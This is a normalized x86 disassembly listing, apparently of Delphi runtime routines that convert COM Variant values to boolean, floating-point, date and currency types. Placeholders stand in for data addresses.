mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410294
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_4106d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41078f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412858
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_40831c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410796
lea eax [ ebp - 0x10 ]
call sub_403f50
lea eax [ ebp - 0x8 ]
call sub_404630
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ea74
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ea74
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_4107a0
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ea74
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_4107e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410834
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f140
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410890
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41083b
lea eax [ ebp - 0x11 ]
call sub_40ee18
retn
sub_410844
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41432c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410890
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4108aa ]
mov eax ebx
call sub_4106d8
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_4106d8
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410890
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_4107a0
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_4107e0
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e5e0
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410844
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4107a0
mov [ esp ] al
mov eax ebx
call sub_4107a0
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410a6c ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_4106d8
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410890
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410be4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410c99
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412858
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041d8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409580
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ea74
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ea74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ca0
lea eax [ ebp - 0x1c ]
call sub_403f50
lea eax [ ebp - 0xc ]
call sub_404630
retn
sub_410ca8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ea74
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410cf4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410d49
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f140
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410da4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d50
lea eax [ ebp - 0x18 ]
call sub_40ee18
retn
sub_410d58
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41432c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410da4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410dc0 ]
mov eax ebx
call sub_410be4
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410be4
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410da4
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410ca8
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410cf4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e5e0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410d58
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410ca8
fstp [ esp ]
fwait
mov eax ebx
call sub_410ca8
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410f9d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410be4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410da4
fstp [ esp ]
fwait
jmp r-xdata
sub_41113c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_4112a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410da4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41115e ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e5e0
sub_4112cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4113a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412858
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041d8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40adac
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113af
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0xc ]
call sub_404630
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4041d8
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_40959c
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ea74
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ea74
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_4113b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ea74
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411418
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ea74
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411464
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4114b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f140
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411514
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4114c0
lea eax [ ebp - 0x18 ]
call sub_40ee18
retn
sub_4114c8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41432c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411514
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411530 ]
mov eax ebx
call sub_4112cc
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411418
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4112cc
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4113b8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411514
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411418
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411464
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e5e0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4114c8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411418
fstp [ esp ]
fwait
mov eax ebx
call sub_411418
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4116fb ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411418
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4112cc
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4113b8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411514
fstp [ esp ]
fwait
jmp r-xdata
sub_411864
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411910
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412858
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4041d8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_4095f4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411917
lea eax [ ebp - 0x10 ]
call sub_403f50
lea eax [ ebp - 0xc ]
call sub_404630
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ea74
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ea74
jmp r-xdata
sub_411920
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ea74
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411980
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ea74
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_4119cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411a21
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f140
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411a7c
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411a28
lea eax [ ebp - 0x18 ]
call sub_40ee18
retn
sub_411a30
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41432c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411a7c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411a98 ]
mov eax ebx
call sub_411864
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
